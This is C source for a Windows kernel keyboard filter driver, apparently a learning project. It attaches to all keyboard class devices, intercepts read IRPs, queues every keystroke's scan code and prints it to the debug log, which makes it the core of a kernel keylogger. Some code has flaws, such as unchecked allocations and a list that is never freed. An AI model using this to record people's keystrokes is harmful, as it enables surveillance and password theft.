/////////////////////////////////////////////////////////////////////////////
//
// (c) Copyright 1999-2014 CodeMachine Incorporated. All rights Reserved.
// Developed by CodeMachine Incorporated. (http://www.codemachine.com)
//
////////////////////////////////////////////////////////////////////////////

#include <ntddk.h>
#include <ntddkbd.h>

// Our notification event to tell the thread to process the recorded keystrokes
KEVENT kStrokeBufferEvent;

// Next we want to put the scan code in some global data structure and then we want to
// have some worker thread wait for some event(waitFOrEvent) to mange the data. Worker
// thread allows us to do things at a lower dispatch level since it is raised in a completion routine.
LOOKASIDE_LIST_EX kStrokeLookasideList;

#define _OBJECT_TYPE POBJECT_TYPE*

typedef struct _DEVICE_EXTENSION {
        LONG PendingIrp;

        // Need to store pointer to next device in the stack to pass the IRP down to
        PDEVICE_OBJECT AttachedDevice;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

// A node for a list containing the keystroke data
typedef struct _KEYSTROKE_DATA {
    // Struct containing the raw keystroke data
    KEYBOARD_INPUT_DATA KeyboardInputData;

    // Pointer to the next item in the list
    LIST_ENTRY ListEntry;
} KEYSTROKE_DATA, *PKEYSTROKE_DATA;

// KEYSTROKE_DATA list head
KEYSTROKE_DATA KEYSTROKE_DATA_LIST_HEAD;

// KEYSTROKE_DATA_LIST spinlock for our ExInterlockedTailList
KSPIN_LOCK KEYSTROKE_DATA_LIST_LOCK;

NTKERNELAPI
NTSTATUS
ObReferenceObjectByName(
    IN PUNICODE_STRING ObjectName,
    IN ULONG Attributes,
    IN PACCESS_STATE PassedAccessState OPTIONAL,
    IN ACCESS_MASK DesiredAccess OPTIONAL,
    IN POBJECT_TYPE ObjectType,
    IN KPROCESSOR_MODE AccessMode,
    IN OUT PVOID ParseContext OPTIONAL,
    OUT PVOID* Object
);

NTSTATUS 
DriverEntry(
    IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath );

VOID 
DriverUnload (
    PDRIVER_OBJECT DriverObject );

// place the DriverEntry() in the .INIT section
// such that it is discarded after execution
#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT,DriverEntry)
#endif

// Simply pass down IRPs we are not interested in to the 
// next device. "Copy" IRP stack to next device and pass through.
NTSTATUS 
DispatchPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    // Traditionally we could do:
    // IoCopyCurrentStackLocationToNext(Irp);
    // return IoCallDriver(DeviceObject->DeviceExtension.AttachedDevice, Irp);
    // 
    // IrpCopyCurrentStackLocationToNext will copy all fields in IoStackLocation except completion routines
    // to the next stack location. If we do not care about the IRP were passing down we shouldnt waste the
    // time copying  the stack to the next stack location.
    //
    // Instead we use IoSkipCurrentIrpStackLocation which simply prevents the stack pointer from advancing
    // in the next IoCallDriver. This way the next device will already be pointing to the correct stack location
    // since the stack pointer was not advanced and we avoid having to copy.

    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

    // We want to pass down stack we already have. Rather then copy contents we retard the stack pointer
    
    IoSkipCurrentIrpStackLocation(Irp);

    // Pass the IRP to next device
    return IoCallDriver(deviceExtension->AttachedDevice, Irp);
}

// This is the completion routine we registered in `DispatchReadKey`. This
// is the function where we read the actual scancode from the IRP
NTSTATUS 
IoCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
    DbgPrint("Entering completion routine\n");
    UNREFERENCED_PARAMETER(Context);

    if (Irp->PendingReturned) IoMarkIrpPending(Irp);

    // We're interestred in successful IRPs
    if (Irp->IoStatus.Status == STATUS_SUCCESS)
    {
        const ULONG scanCodesCount = (ULONG)Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
        DbgPrint("scanCodesCount: %x\n", scanCodesCount);
        const PKEYBOARD_INPUT_DATA keyboardInputData = Irp->AssociatedIrp.SystemBuffer;
        
        for (ULONG i = 0; i < scanCodesCount; i++)
        {
            const PKEYBOARD_INPUT_DATA currentKeyboardData = &keyboardInputData[i];
            
            DbgPrint("test  %x\n", currentKeyboardData->MakeCode);
            
            /*
            DbgPrint("UnitId: %hu, MakeCode: = %hu, Flags = 0x%02hx, ExtraInfo = 0x%081x\n",
                currentKeyboardData->UnitId, currentKeyboardData->MakeCode, currentKeyboardData->Flags,
                currentKeyboardData->ExtraInformation);
            */

            // Allocate from lookaside list to store keystroke data to our linked list
            PKEYSTROKE_DATA kStrokeData = ExAllocateFromLookasideListEx(&kStrokeLookasideList);

            kStrokeData->KeyboardInputData.UnitId = currentKeyboardData->UnitId;
            kStrokeData->KeyboardInputData.MakeCode = currentKeyboardData->MakeCode;
            kStrokeData->KeyboardInputData.Flags = currentKeyboardData->Flags;
            kStrokeData->KeyboardInputData.ExtraInformation= currentKeyboardData->ExtraInformation;

            // I believe we want this to be thread safe incase there are multiple 
            // keyboards attached to the system
            ExInterlockedInsertTailList(&KEYSTROKE_DATA_LIST_HEAD.ListEntry, &kStrokeData->ListEntry, &KEYSTROKE_DATA_LIST_LOCK);
            
            DbgPrint("Inserted into out linked list \n");

            // Set some event here to signal to the thread running at passive level theres work to be done
            KeSetEvent(
                &kStrokeBufferEvent,
                IO_NO_INCREMENT,
                FALSE);
            
            DbgPrint("Set kStrokeBufferEvent to signaled\n");

            // Now some thread should see the signaled event and process the information
        }
        
    }

    const PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    InterlockedDecrement(&DeviceExtension->PendingIrp);

    return STATUS_SUCCESS;
}

NTSTATUS
DispatchReadKey(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    const PDEVICE_EXTENSION DeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

    // Increment pending IRPs
    InterlockedIncrement(&DeviceExtension->PendingIrp);

    // Copy current IRP stack to next
    IoCopyCurrentIrpStackLocationToNext(Irp);

    // Register our completion routine
    IoSetCompletionRoutine(Irp,
                           IoCompletionRoutine,
                           NULL,
                           TRUE, TRUE, TRUE);

    return IoCallDriver(DeviceExtension->AttachedDevice, Irp);

}

NTSTATUS
DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS ntStatus;
    UNICODE_STRING KbdClassDriverStr;
    UNICODE_STRING IoDriverObjectTypeStr;
    UNICODE_STRING IoDeviceObjectTypeStr;

    // Initialize our event used to signal processing of the keystroke data
    // by a worker thread
    KeInitializeEvent(
        &kStrokeBufferEvent,
        NotificationEvent,
        FALSE);

    RtlInitUnicodeString(&KbdClassDriverStr, L"\\Driver\\Kbdclass");

    RtlInitUnicodeString(&IoDriverObjectTypeStr, L"IoDriverObjectType");
    const _OBJECT_TYPE IoDriverObjectType = MmGetSystemRoutineAddress(&IoDriverObjectTypeStr);
    
    if (IoDriverObjectType == NULL) {
        DbgPrint("Failed to acquire address for IoDriverObjectType\n");
        return STATUS_INTERNAL_ERROR;
    }

    RtlInitUnicodeString(&IoDeviceObjectTypeStr, L"IoDeviceObjectType");
    const _OBJECT_TYPE IoDeviceObjectType = MmGetSystemRoutineAddress(&IoDeviceObjectTypeStr);

    if (IoDeviceObjectType == NULL) {
        DbgPrint("Failed to acquire address for IoDeviceObjectType\n");
        return STATUS_INTERNAL_ERROR;
    }

    DriverObject->DriverUnload = DriverUnload;

    // Pass through all IRPs we don't care about down the stack
    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = DispatchPassThrough;
    }

    // Register routine we want to monitor
    DriverObject->MajorFunction[IRP_MJ_READ] = DispatchReadKey;

    // Initialize our lookaside list to store our keystrokes. This makes sense
    // since we will constnatly be allocating and freeing chunks of the same size
    // of memory so we should get a perf improvement.
    ntStatus = ExInitializeLookasideListEx(
        &kStrokeLookasideList,
        NULL,
        NULL,
        NonPagedPoolNx,
        EX_LOOKASIDE_LIST_EX_FLAGS_RAISE_ON_FAIL,
        sizeof(KEYSTROKE_DATA),
        '1337',
        0);

    if (!NT_SUCCESS(ntStatus))
    {
        DbgPrint("Failed to initialize lookaside list with error code %x", ntStatus);
        return ntStatus;
    }

    // Initialize our keystroke data list by setting the `Flink` and `Blink`
    // of the head of the list to its self
    InitializeListHead(&KEYSTROKE_DATA_LIST_HEAD.ListEntry);

    // Initialize the spinlock which will guard our keystroke list
    KeInitializeSpinLock(&KEYSTROKE_DATA_LIST_LOCK);

    // Obtain pointer to the KbdClass driver
    PDRIVER_OBJECT kbdClassDriver;
    ntStatus = ObReferenceObjectByName(&KbdClassDriverStr,
                                       OBJ_CASE_INSENSITIVE,
                                       0,
                                       0,
                                       *IoDriverObjectType,
                                       KernelMode,
                                       NULL,
                                       (PVOID)&kbdClassDriver);

    if (!NT_SUCCESS(ntStatus)) 
    {
        DbgPrint("Failed to reference KbdClassDriver object by name with error code %x", ntStatus);
        return ntStatus;
    }

    // Get ref to the KeyboardClassDriver device
    PDEVICE_OBJECT kbdClassDevice = kbdClassDriver->DeviceObject;

    // Attach to all keyboard devices
    while (kbdClassDevice != NULL) {

        // Increase ref to the KeyboardClassDevice so it does not get unloaded while were using it
        ntStatus = ObReferenceObjectByPointer((PVOID)kbdClassDevice,
            0,
            *IoDeviceObjectType,
            KernelMode);

        PDEVICE_OBJECT kbdClassFilterDevice = NULL;

        ntStatus = IoCreateDevice(DriverObject,
            sizeof(DEVICE_EXTENSION),
            NULL,
            FILE_DEVICE_KEYBOARD,
            0,
            TRUE,
            &kbdClassFilterDevice);

        if (!NT_SUCCESS(ntStatus)) {
            DbgPrint("Failed to create the kbdClassFilterDevice with error code %x", ntStatus);
            return ntStatus;
        }

        // Attach filter to KeyboardClassDevice stack
        DEVICE_EXTENSION* const deviceExtension = kbdClassFilterDevice->DeviceExtension;

        deviceExtension->PendingIrp = 0;

        // Attach filter device and store `AttachedDevice` so we know where to forward the IRP to
        deviceExtension->AttachedDevice = IoAttachDeviceToDeviceStack(kbdClassFilterDevice, kbdClassDevice);

        if (deviceExtension->AttachedDevice == NULL) {
            DbgPrint("Failed to attach filter device to KeyboardClass device\n");
            return STATUS_INTERNAL_ERROR;
        }

        DbgPrint("Attached to device\n");

        // Mark as done initializing so we can recieve IRPs and set buffered IO(KeyboardClass uses buffered IO)
        kbdClassFilterDevice->Flags |= DO_BUFFERED_IO;
        kbdClassFilterDevice->Flags &= ~DO_DEVICE_INITIALIZING;

        // Release refs after finishing setup
        ObDereferenceObject(kbdClassDevice);
        kbdClassDevice = kbdClassDevice->NextDevice;
    }
    ObDereferenceObject(kbdClassDriver);
    
    DbgPrint("[+] Successfully loaded driver and attached filter devices to all keyboard stacks\n");
    return STATUS_SUCCESS;
} // DriverEntry()

VOID 
DriverUnload (
    PDRIVER_OBJECT DriverObject )
{
    PDEVICE_OBJECT kbdClassFilterDevice = DriverObject->DeviceObject;
    LARGE_INTEGER waitPeriod;
    waitPeriod.QuadPart = -25000;

    while (kbdClassFilterDevice != NULL) {
        DEVICE_EXTENSION* const deviceExtension = kbdClassFilterDevice->DeviceExtension;
        PDEVICE_OBJECT nextKbdClassFilterDevice = kbdClassFilterDevice->NextDevice;
        
        // Remove filter from the stack
        IoDetachDevice(deviceExtension->AttachedDevice);

        // We must wait for any pending IRPs before we delete the device
        
        do {
            KeDelayExecutionThread(KernelMode, FALSE, &waitPeriod);
        }
        while (InterlockedCompareExchange(&deviceExtension->PendingIrp, 0, 0) > 0);
        
        // Reference counter must drop to zero
        ASSERT(deviceExtension->PendingIrp >= 0);
        
        DbgPrint("[+] A keyboard filter device was removed\n");
        IoDeleteDevice(kbdClassFilterDevice);
        kbdClassFilterDevice = nextKbdClassFilterDevice;
    }

    // Delete the lookaside list
    ExDeleteLookasideListEx(&kStrokeLookasideList);

    DbgPrint("Finished unloading filter devices\n");
    DbgPrint("Driver successfuly unloaded and cleaned up\n");
}
